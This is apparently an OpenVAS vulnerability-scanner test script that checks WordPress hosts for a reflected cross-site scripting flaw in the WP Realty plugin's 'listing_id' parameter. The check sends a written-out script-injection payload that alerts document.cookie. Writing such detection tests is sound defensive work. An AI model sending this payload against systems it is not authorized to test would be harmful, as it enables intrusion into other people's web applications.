###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_wp_realty_xss_n_sql_inj_vuln.nasl 33822 2014-01-02 15:02:10Z Jan$
#
# WordPress WP Realty Plugin 'listing_id' XSS and SQL Injection Vulnerabilities
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804054");
  script_version("$Revision: 11402 $");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-09-15 11:13:36 +0200 (Sat, 15 Sep 2018) $");
  script_tag(name:"creation_date", value:"2014-01-02 15:02:10 +0530 (Thu, 02 Jan 2014)");
  script_name("WordPress WP Realty Plugin 'listing_id' XSS and SQL Injection Vulnerabilities");


  script_tag(name:"summary", value:"This host is installed with Wordpress WP Realty Plugin and is prone to
multiple vulnerabilities.");
  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request and check whether it is able to read
cookie or not.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"insight", value:"Input passed via the 'listing_id' parameter to index_ext.php script is
not properly sanitized before being returned to the user.");
  script_tag(name:"affected", value:"WordPress WP Realty plugin.");
  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary HTML and
script code in a user's browser session in the context of an affected site
or execute arbitrary SQL commands in applications database and gain complete
control over the vulnerable web application.");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/29021");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/124418");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/wordpress-wp-realty-cross-site-scripting");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

url = dir + '/wp-content/plugins/wp-realty/index_ext.php?action='+
            'contact_friend&popup=yes&listing_id="/><script>aler'+
                                   't(document.cookie);</script>';

## Extra check is not possible
if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
   pattern:"<script>alert\(document.cookie\);</script>"))
{
  security_message(http_port);
  exit(0);
}
